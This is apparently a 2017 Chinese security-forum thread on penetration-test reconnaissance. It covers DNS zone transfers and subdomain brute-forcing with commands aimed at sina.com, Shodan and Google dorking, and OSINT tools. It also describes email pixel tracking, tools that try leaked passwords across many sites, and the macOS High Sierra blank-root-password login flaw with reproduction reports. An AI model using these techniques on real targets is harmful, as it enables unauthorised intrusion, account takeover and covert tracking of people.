但是呢，dig 不能查询一个域名下的所有记录，但是做渗透测试，我们想知道一个dns服务器下的所有记录，但是如何获得一个域名服务器下的所有记录呢？

1、利用dig查询bind版本，通过查询bind版本信息（dns的bind版本）查看存在的漏洞，对dns服务器进行攻击，进而取得所有的记录，但是经过我努力，一般看不到bind版本信息

基本命令：

```
dig +noall +answer txt chaos(类) VERSION.BIND @ns3.dnsv4.com
```

这个命令的意思是：查询txt记录，他是chaos类，一般查的ns,cname,a记录都是inter类，可以通过抓包看包内容查看记录是什么类，后面接的表示查询bind版本，@后接要查的dns服务器

2、dns区域传输：（配合抓包）
    
利用dns之间的同步机制（一台dns服务器上的变更可以同步到其他的服务器，一般区域传输至存在于本地dns服务器上，如果管理员配置错误，就有可能让人访问到所有的记录），首先利用nslookup或者dig查询域名下的dns服务器，还是配合抓包，了解原理，而不是了解工具使用
    
常见命令：

```    
1、 dig @ns1.example.com example.com axfr(区域传输的方法：差异化传输) #一般不会成功，除非配置错误
2、host -T (使用TCP）-l（采用axfr传输） sina.com ns3.sina.com（host命令没有深入了解，我一般只是配合使用）
```
         
[host命令_Linux host 命令用法详解：常用的分析域名查询工具](http://man.linuxde.net/host)

（这个网址大家可以看下参数配置，熟悉命令的使用）

3、dns字典爆破：一般区域传输都不会成功，特别是大型网站，所以介绍几个常用的dns字典爆破工具，原理就是向dns服务器发送查询，如果有这个记录，就会返回结果，反之不返回，利用这个原理进行暴力破解。一般选一个顺手的就行，也可以每个都试试，不同的工具爆破的速度，字典的质量不同，也可以把每个工具下的字典组合起来，生成一个自己的专有字典，下面是几个常见的工具，太多，不详细介绍，大家使用-h看具体参数操作，一定要亲自尝试，实践才最牛

```
fierce -dnsserver 192.168.1.1 -dns sina.com.cn -wordlist a.txt 
dnsdict6 -d4 -t 16(使用线程数) -x sina.com（这个比较好，速度也快）
dnsenum -f dnsbig.txt  -dnsserver 8.8.8.8 sina.com -o sina.txt
dnsmap sina.com -w dns.txt
dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
dnsrecon -t std -d sina.com
```

这次的介绍就到这里了，介绍了那么多，还是推荐大家一定要抓包，看这些包是怎么发送和接受的，里面有什么，不要局限于工具的使用，下次我将介绍被动信息收集的
之利用搜索引擎进行信息收集部分



...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 问一下 nslookup 有如下这种用法吗？
nslookup 随机字符串 target-ip

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没试过这种用法，你的随机字符串是？

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 就是从一段字符串中随机选择其中的一段子字符串

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 没有哇，我查过man手册没有这种用法

<img src="https://file.xiaomiquan.com/ed/8e/ed8e264a6c1b3e6acd2f7423ad6ccc19dfd5810cd3b64c1a1c58cc6e04010c56.jpg" width="25px"/> __bit4__: 必须要安利一下小菜我弄的脚本了😆 
[https://github.com/bit4woo/Teemo](https://github.com/bit4woo/Teemo)




...

---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-10:


__#基础#__

 被动信息收集之搜索引擎
上次我们介绍了dns的信息收集之区域传输和字典爆破，这次我来介绍关于信息收集之搜索引擎方面的内容
1、
首先，来介绍下搜索引擎能做什么
 ①：收集要渗透的公司的新闻动态
 ②：重要的雇员信息，比如这个雇员是那个大佬，他的职务，所掌握的信息
 ③：机密文档/网络拓扑：有些公司的机密文档是放在公网上的，但是隐藏了，但是会被强大的搜索引擎扫出来
 ④：用户名和密码：有些用户名密码是默认的，这就可以通过搜索引擎查找，比如某品牌的摄像头设置了默认密码，就可以通过搜索引擎查看这个品牌的默认密码，也有一些密码可能被别人脱裤啦，放到了网上，我们也可以查到，然后利用撞库尝试密码
 ⑤：目标系统的技术架构：搜集你要渗透的公司的技术架构，用的是什么软硬件，什么版本，有什么已经公开的漏洞

介绍完了，接下来开始介绍搜索几种引擎：
一、shodan:
   shodan是一款功能强大的搜索引擎，但是它不爬取网页信息，只爬去各种网路设备，例如http、ftp、ssh、telent等
   地址：
[https://www.shodan.io](https://www.shodan.io)


1、
   常见filiter:
```
net:192.168.1.1(指定要搜索的地址)
country:CN、US、JP（将搜索结果限定在某个国家）
city:beijing
port:80
os:windows/linux
hostname:kali
server:apache
```

以上是常见的fliter，当然，这么强大的搜索引擎怎么可能只有这么少的filiter,大家可以在搜索框旁边的explore,点进去看看别人是怎么写filiter的

2、更加详细的用法在下面这个链接：
     
[http://www.freebuf.com/sectool/121339.html](http://www.freebuf.com/sectool/121339.html)



二、google:
要说google是世界上最好的搜索引擎我想是没有异议的，用好google进行信息收集也是一名安全从业人员的基本功，下面介绍google

1、基本使用：+

```
支付 -充值（要支付，不要充值） 
支付 充值（支付&&充值）
“ 支付 充值”（只含 “支付 充值”这个字段）
intitle:电子商务
intext:（正文）
site:搜索的站点
inurl:contact(网址中含有电话的)
filetype:pdf(搜索pdf文件)
```

同样的，强大的google也不会局限于简单的filiter,大家也可以通过下面的网址学习别人的filiter是怎么写的,这个链接就是google hacking，当然也有其他的hacking,例如baidu hacking、bing hacking等，这个大家自行探索
          
[https://www.exploit-db.com/google-hacking-database/](https://www.exploit-db.com/google-hacking-database/)


今天的介绍就到这里了，下一次我会将剩下的被动信息收集的内容进行收尾，在介绍一个n合一的工具：maltegoce,还有简单好用的thehavarester



---

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__ on 2017-09-19:


__#基础#__

被动信息收集之收尾和工具介绍

1、thehavarester:电子邮件，用户名和主机名/子域名信息收集工具，不支持代理,需要使用proxychains进行调用。调用搜索引擎以及社交媒体进行搜索

常用参数

```
-d:指定搜索的域
-l：要搜索的量
-b:指定搜索引擎
```

注意！！当搜索量过大会触发搜索引擎的保护机制！！

2、metagoofil ：基于google搜索的文档收集工具，同样需要使用proxychains进行调用，因为这个工具是基于google搜索引擎搜索的，除非设置了代理

参数：

```
-d:指定域名
-t:指定要搜索的文件
-l:限制搜索量
-n:限制下载文件的量
-o：指定下载路径
-f:输出文件名
```

同样的，当搜索量过大会触发搜索引擎的保护机制！！

3、Maltego:一个十分牛逼的工具，可以将所有的被动信息收集集于一体，第一次使用需要注册，图形化工具，界面十分清晰。

以上的三个工具可以查看下面这个链接获得详细信息

    
[使用Kali Linux在渗透测试中信息收集 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/system/58096.html)



4、被动信息收集框架：recon-ng

recon-ng类似于msf，并且和msf的使用有异曲同工之妙，详细可以看下面的链接：
   
[web渗透信息侦察收集工具——Recon-ng - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/web/7385.html)



这次的收尾想了很久怎么写，但是我才疏学浅，而且这些工具需要大量的实践，限于篇幅，不能详细介绍，只能找比较好的链接，但是，分享仅仅是一个途径，真正的进步还是靠自己，以上介绍的工具使用大家一定要结合大量的实践并通过抓包了解是怎样的机制，不要只是限于工具的使用

安利最近差不多看完的一本书《Python黑帽子:黑客与渗透测试编程之道》，不要仅限于成为一个脚本小子！共勉



---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-11-23:

IP-Biter 邮件追踪系统 也就是说所谓的像素追踪

此种追踪不需要漏洞，在两个产业用的比较的多，1.广告公司 2.APT信息收集

其原理就是发送邮件时插入图片，当别人打开邮件查看的时候，访问了远程的图片，你在Web日志这边可以获取到ip、User-anget等信息。此攻击收集信息有限

为了应对这种信息收集的方式，国内的邮箱厂商发现邮件里有图片时，需要手动点击加载，Gmail图片缓存在服务器，不存在这种问题。

不得不说，老外弄的东西，还是考虑很完善，还有跟踪报告，用户代理分析。我当时用的时候就写了个php脚本临时用了下，有时候获取到信息，我几天后才知道尴尬
  
[GitHub - damianofalcioni/IP-Biter: IP-Biter: The H...](https://github.com/damianofalcioni/IP-Biter)


```
<img src=http://127.0.0.1/fuckme/1.php?name=sanr@qq.com>
```

<img src="https://file.xiaomiquan.com/12c/d8/2cd8953d528fe350ee250a376e0148bbbb9120a74ce8bd0ff52fc75264072035.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1c2/3b/c23b1070720098b14766115a97d9728187ba92f5a076f3921f52be03e1279c81.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/182/bb/82bbf7d214cdb9431f4c73a6898609ebc92bceaae65bf4bd7a0d521dc98c44c5.png" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__: 更正：User Agent

...

---

<img src="https://file.xiaomiquan.com/fe/71/fe71de437c5674d403f6c4d6476c754511998d5ede4151feaaec7c7c2fa6001d.jpg" width="25px"/> __Sanr__ on 2017-12-04:


__#tools#__

 密码重用检测工具

比如你通过邮件或者社工库拿到一个账户密码，可批量登录指定网站，看下密码是否通用。

shard(需自行指定账户密码)之后对Facebook、LinkedIn、Reddit、Twitter、Instagram、GitHub、BitBucket、Kijiji、DigitalOcean、Vimeo、Laposte、DailyMotion这些网站登录
   
[GitHub - philwantsfish/shard: A command line tool ...](https://github.com/philwantsfish/shard)


Cr3dOv3r 从泄漏库(hacked-emails)中搜索泄漏邮箱的信息(简单的理解就是去社工库搜到了密码，之后批量登录)，然后对16个网站进行登录，之后返回结果。
   
[GitHub - D4Vinci/Cr3dOv3r: Know the dangers of cre...](https://github.com/D4Vinci/Cr3dOv3r)

---


## Mac



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-29:


__#漏洞#__

   Mac root 无密码直接登录

测试：系统偏好设置，用户与群组，点按锁按钮以进行更改，root（空密码），回车（可能需要多试几次）

实测成功，还看到如果 Mac 开启相关共享，直接 VNC 远程可以 root 控制，这就有点可怕了。而且有人开始全球扫描了……

这个缺陷太低级了，之前也提过：苹果安全生态令人堪忧。

太骄傲了？


<img src="https://file.xiaomiquan.com/153/51/535123bfd469d7c88059070d6bdd2809a34b78873984dc3b4eebf7d98a4ef251.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1b7/97/b797e74a3facdcb379573943d5a9622b81c2383181092a915672245361c4422d.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/146/94/46944f337016cdbd1bbc24d7a611571be4033f39294f1c24c742f0c906cf867d.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 有同事亲测复现，网上还有人说 SSH 远程也测试成功

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 可怕 谁继续试试

<img src="https://file.xiaomiquan.com/e7/c9/e7c94d7a3222c301465410c48a6d579ecbf028f83e63b94f471111d407eb293c.jpg" width="25px"/> __啊春__: Sierra 没问题，10.12.6

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e7/c9/e7c94d7a3222c301465410c48a6d579ecbf028f83e63b94f471111d407eb293c.jpg" width="25px"/> __啊春__: 嗯，得是 High，新版

<img src="https://file.xiaomiquan.com/eb/4a/eb4a999b549d3d086b2661b1f64ed47690bdf522eb96e4aee545f79d2d11983a.jpg" width="25px"/> __耶路撒不冷__: 测试了一下，如果直接用root登录是不行的。但是在用户和群组用root试一次之后，奇迹就发生了。。。 之后直接退出当前用户，用root用户就可以无密码登录了。

<img src="https://file.xiaomiquan.com/9a/06/9a060c31e7556da8418e4c6d9de5229328b198d85984bd279ceb76bc98108db9.jpg" width="25px"/> __Tr＠cer_0x06lA__: 我自己的也测试成功了，怪我前天手贱升级到High

<img src="https://file.xiaomiquan.com/00/b4/00b4853b1c1ae26914034643d698dcfbdc4785248a7815636f0afb49695c5a76.jpeg" width="25px"/> __abcd__: 我试了一下，13.1的版本，改了root的密码就不行了，不知道有人试过吗

<img src="https://file.xiaomiquan.com/31/8a/318a89d2d7b512ffc66e279053ce2a341071e65bfcb86e9111f8affda7fb68c3.jpg" width="25px"/> __.o.__: 成功了...10.13.1

<img src="https://file.xiaomiquan.com/31/8a/318a89d2d7b512ffc66e279053ce2a341071e65bfcb86e9111f8affda7fb68c3.jpg" width="25px"/> __.o.__: 用root 空密码解锁后..
在注销当前用户。就能看到两个用户...一个你自己。一个其他..也就是root

...

---